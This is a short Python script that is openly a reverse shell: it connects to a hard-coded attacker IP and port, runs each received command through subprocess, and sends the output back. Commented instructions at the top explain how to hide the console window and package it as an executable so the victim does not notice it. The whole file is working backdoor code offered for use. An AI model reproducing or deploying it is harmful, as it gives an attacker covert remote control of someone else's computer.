
# from win32con import SW_HIDE                                                                                  
# import win32gui

# def hidden():
#     pid = win32gui.GetForegroundWindow()
#     win32gui.ShowWindow(pid , SW_HIDE)

# hidden()

#!!! if you want hiden the cmd page : 
#####################################
# 1- delet all print in project #####
#####################################
# 2- enabel this line (from 1 to 9)## 
#####################################
# 3- cheng the py to exe ############ !!!
     
              
from os import chdir, getcwd
from time import sleep
import socket
import subprocess


sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

ip = "192.168.1.5"  # set the hacker ip


port = 8080 # set the hacker port
sock.connect((ip , port))

while True:
 data = "ok !!"
 command = sock.recv(9999).decode()
 print(command)
 if command == b"exit":
        sock.close()
        break
 
 masirh = getcwd()
 def cd() :
   global masirh
   global command
   global data
   if command == None :
       pass
   elif "cd.." in command or "cd .." in command :
       command = ".."
       chdir(command)
       masirh = getcwd()

   elif "cd " in command[0:4]:
    l = command[3:]
    s = chdir(masirh+"\\"+l)
    masirh = getcwd()


 
 if "cd" in command[0:4]:
     cd()
 else :
    data = subprocess.getoutput(command)

 sock.send(data.encode())
 sleep(0.5)
 sock.send(masirh.encode())

 
